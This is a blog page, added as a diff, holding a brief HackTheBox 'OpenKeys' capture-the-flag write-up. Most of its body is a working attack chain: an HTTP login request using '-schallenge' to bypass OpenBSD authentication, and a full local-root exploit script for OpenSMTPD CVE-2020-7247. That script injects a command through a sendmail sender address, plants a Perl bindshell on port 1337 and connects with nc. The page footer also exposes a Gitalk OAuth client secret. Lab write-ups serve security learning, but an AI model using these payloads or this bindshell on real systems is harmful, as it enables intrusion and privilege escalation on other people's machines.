@@ -1,0 +1,465 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/null">
+  <link rel="icon" type="image/png" href="/null">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="FunPhishing">
+  <meta name="keywords" content="">
+  <title>HackTheBox-OpenKeys WriteUp - Fun Phishing</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fun With Phishing</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/chat/">
+                <i class="iconfont icon-user-fill"></i>
+                chat
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgb(36, 35, 35)">
+                <div class="modal-body mx-3">
+                <div class="md-form mb-5">
+                <input type="text" id="local-search-input" class="form-control validate">
+                <label data-error="x" data-success="v"                
+                 for="local-search-input">Keyword.</label> 
+                </div>
+                  <div class="list-group" id="local-search-result"></div>
+                </div>
+                
+              
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-OpenKeys WriteUp</h1>
+            
+            <div class="markdown-body">
+              <ul>
+<li>INT<blockquote>
+<p>nmap<br>IP: 10.10.10.199<br>port:22<br>22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)<br>port:80<br>OpenKeyS - Retrieve your OpenSSH Keys #maybe keyword<br>OS:FreeBsd</p>
+</blockquote>
+</li>
+<li>Port 80 Enum<blockquote>
+<p><a target="_blank" rel="noopener" href="http://10.10.10.199/includes/auth.php.swp">http://10.10.10.199/includes/auth.php.swp</a><br>jennifer<br>jenniferopenkeys.htb/var/www/htdocs/includes/auth.php<br>OpenBSD authentication login POC (can use)</p>
+  <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">POST /index.php HTTP/1.1<br>Host: 10.10.10.199<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 41<br>Origin: http://10.10.10.199<br>Connection: close<br>Referer: http://10.10.10.199/index.php<br>Cookie: PHPSESSID=8hivfuib14nvufhqeejtqigfqf;username=jennifer<br>Upgrade-Insecure-Requests: 1<br><br>username=&quot;-schallenge&quot;&amp;password=&quot;-schallenge&quot;<br></code></pre></div></td></tr></table></figure>
+<p>Get SSH key</p>
+</blockquote>
+</li>
+<li>User<blockquote>
+<p>ssh -i ssh.key <a href="mailto:&#x6a;&#101;&#x6e;&#x6e;&#x69;&#x66;&#101;&#x72;&#64;&#x31;&#x30;&#46;&#x31;&#x30;&#46;&#x31;&#48;&#x2e;&#x31;&#57;&#x39;">&#x6a;&#101;&#x6e;&#x6e;&#x69;&#x66;&#101;&#x72;&#64;&#x31;&#x30;&#46;&#x31;&#x30;&#46;&#x31;&#48;&#x2e;&#x31;&#57;&#x39;</a></p>
+</blockquote>
+</li>
+<li>Root<blockquote>
+<p>CVE-2020-7247</p>
+  <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">    #!/bin/sh<br><span class="hljs-meta">#</span><span class="bash"> root66 - OpenBSD 6.6 OpenSMTPD 6.6 <span class="hljs-built_in">local</span> root exploit <span class="hljs-keyword">for</span> CVE-2020-7247</span><br><span class="hljs-meta">#</span><span class="bash"> starts a perl bindshell on port 1337 with root privileges</span><br><span class="hljs-meta">#</span><br><span class="bash"><span class="hljs-comment"># Code mostly stolen from Qualys PoCs:</span></span><br><span class="hljs-meta">#</span><span class="bash"> - https://www.openwall.com/lists/oss-security/2020/01/28/3</span><br><span class="hljs-meta">#</span><span class="bash"> - https://blog.qualys.com/laws-of-vulnerabilities/2020/01/29/openbsd-opensmtpd-remote-code-execution-vulnerability-cve-2020-7247</span><br><span class="hljs-meta">#</span><span class="bash"> - https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt</span><br><span class="hljs-meta">#</span><span class="bash"> ---</span><br><span class="hljs-meta">#</span><span class="bash"> openbsd-6-6-x64$ ./root66</span><br><span class="hljs-meta">#</span><span class="bash"> OpenBSD 6.6 OpenSMTPD 6.6 <span class="hljs-built_in">local</span> root exploit (CVE-2020-7247)</span><br><span class="hljs-meta">#</span><span class="bash"> [*] id: uid=1001(<span class="hljs-built_in">test</span>) gid=1001(<span class="hljs-built_in">test</span>) groups=1001(<span class="hljs-built_in">test</span>)</span><br><span class="hljs-meta">#</span><span class="bash"> [*] checking system ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] directory /tmp/.payload is writable</span><br><span class="hljs-meta">#</span><span class="bash"> [*] 019_smtpd_exec patch has not been installed</span><br><span class="hljs-meta">#</span><span class="bash"> [*] writing payload to /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] executing /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">220 openbsd-6-6-x64.localdomain ESMTP OpenSMTPD</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; EHLO localhost</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-openbsd-6-6-x64.localdomain Hello localhost [local], pleased to meet you</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-8BITMIME</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-ENHANCEDSTATUSCODES</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-SIZE 36700160</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 HELP</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; MAIL FROM:&lt;;/tmp/.payload;<span class="hljs-comment">#@&gt;</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.0.0 Ok</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; RCPT TO:&lt;<span class="hljs-built_in">test</span>@openbsd-6-6-x64.localdomain&gt;</span> <br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.1.5 Destination address valid: Recipient ok</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; DATA</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">354 Enter mail, end with &quot;.&quot; on a line by itself</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; .</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.0.0 9493d192 Message accepted for delivery</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; QUIT</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">221 2.0.0 Bye</span></span><br><span class="hljs-meta">#</span><span class="bash"> [*] cleaning up /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] connecting to 127.0.0.1:1337 ...</span><br><span class="hljs-meta">#</span><span class="bash"> Connection to 127.0.0.1 1337 port [tcp/*] succeeded!</span><br><span class="hljs-meta">#</span><span class="bash"> id</span><br><span class="hljs-meta">#</span><span class="bash"> uid=0(root) gid=0(wheel) groups=0(wheel)</span><br><span class="hljs-meta">#</span><span class="bash"> uname -a</span><br><span class="hljs-meta">#</span><span class="bash"> OpenBSD openbsd-6-6-x64.localdomain 6.6 GENERIC<span class="hljs-comment">#353 amd64</span></span><br><span class="hljs-meta">#</span><span class="bash"> ---</span><br><span class="hljs-meta">#</span><span class="bash"> 2020-01-31 - &lt;bcoles@gmail.com&gt;</span><br><span class="hljs-meta">#</span><span class="bash"> https://github.com/bcoles/local-exploits/tree/master/CVE-2020-7247</span><br><br>payload=&quot;/tmp/.payload&quot;<br><br>/bin/echo &quot;OpenBSD 6.6 OpenSMTPD 6.6 local root exploit (CVE-2020-7247)&quot;<br><br>/bin/echo &quot;[*] id: `id`&quot;<br><br>/bin/echo &quot;[*] checking system ...&quot;<br><br>if [ -w `dirname $payload` ]; then<br>  /bin/echo &quot;[*] directory $payload is writable&quot;<br>else<br>  /bin/echo &quot;[-] directory $payload is not writable&quot;<br>  exit 1<br>fi<br><br>if syspatch -l | grep -q 019_smtpd_exec ; then<br>  /bin/echo &quot;[-] 019_smtpd_exec patch has been installed&quot;<br>  exit 1<br>else<br>  /bin/echo &quot;[*] 019_smtpd_exec patch has not been installed&quot;<br>fi<br><br>/bin/echo &quot;[*] writing payload to $payload ...&quot;<br>cat &gt; $payload &lt;&lt; &quot;EOF&quot;<br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>perl -MIO -e &#x27;$p=fork();exit,if$p;foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;=~/(.*)/)&#123;$ENV&#123;$key&#125;=$1;&#125;&#125;$c=new IO::Socket::INET(LocalPort,1337,Reuse,1,Listen)-&gt;accept;$~-&gt;fdopen($c,w);STDIN-&gt;fdopen($c,r);while(&lt;&gt;)&#123;if($_=~ /(.*)/)&#123;system $1;&#125;&#125;;&#x27;<br>EOF<br>/bin/chmod +x $payload<br><br>/bin/echo &quot;[*] executing $payload ...&quot;<br>/bin/echo | /usr/sbin/sendmail -v -f &quot;&lt;;$payload;#@&gt;&quot; `whoami`<br><br>/bin/sleep 1<br><br>/bin/echo &quot;[*] cleaning up $payload ...&quot;<br>/bin/rm $payload<br><br>/bin/echo &quot;[*] connecting to 127.0.0.1:1337 ...&quot;<br>nc -v 127.0.0.1 1337<br></code></pre></div></td></tr></table></figure></blockquote>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WriteUp/">WriteUp</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Hack-The-Box/">Hack The Box</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CVE-2020-7247/">CVE-2020-7247</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: '8080ccee553a4b56b170',
+          clientSecret: '57e093009366203e36c5f167f5c18b6b0027182d',
+          repo: 'chat',
+          owner: 'FunPhishing',
+          admin: ["FunPhishing"],
+          id: 'd69ae3f19933b5273e969f06f3463b4c',
+          language: 'zh-CN',
+          labels: ["Gitalk"],
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: true,
+          distractionFreeMode: false
+        });
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="#" target="_blank" rel="nofollow noopener"><span>FunPhishing</span></a> <i class="iconfont icon-love"></i> <a href="#" target="_blank" rel="nofollow noopener"><span>Search inc.</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
